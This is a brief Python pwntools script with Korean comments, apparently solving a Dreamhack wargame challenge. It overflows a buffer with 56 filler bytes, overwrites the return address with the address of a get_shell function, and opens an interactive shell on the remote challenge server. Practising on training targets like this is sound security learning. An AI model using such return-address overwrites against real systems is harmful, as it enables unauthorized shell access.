from pwn import *

# 1. 원격 인스턴스 서버 연결 (발급받은 포트 기입)
p = remote('host3.dreamhack.games', 17048)

# 2. 페이로드 구성 (더미 데이터 56바이트 + 리틀엔디언으로 패킹된 get_shell 주소)
payload = b'A' * 56
payload += p64(0x4006aa)

# 3. 데이터 전송
p.sendlineafter(b"Input: ", payload)

# 4. 셸 상호작용 모드 전환
p.interactive()